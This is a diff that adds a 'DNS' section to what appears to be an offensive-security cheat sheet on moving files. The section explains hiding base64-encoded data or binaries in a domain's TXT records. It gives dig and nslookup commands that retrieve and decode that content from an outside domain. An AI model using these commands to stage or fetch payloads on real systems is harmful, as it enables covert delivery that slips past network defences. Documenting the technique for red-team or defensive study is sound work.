@@ -504,6 +504,15 @@ func main() {
 ```
 
 
+## DNS
+
+Data/binaries can be base64 encoded and stored in TXT records of a domain under your control, with chunks of 255 characters stored in each record. The TXT records can be retrieved simply using dig/nslookup, and the data retrieval process can be automated in Python etc.
+
+`dig +short TXT megalogisticshipping.com | awk -F"\"" '{ print $2 }' | base64 -d -w0`
+
+`nslookup -type=TXT megalogisticshipping.com 2> nul | findstr "\""`
+
+
 ## Web Servers
 
 
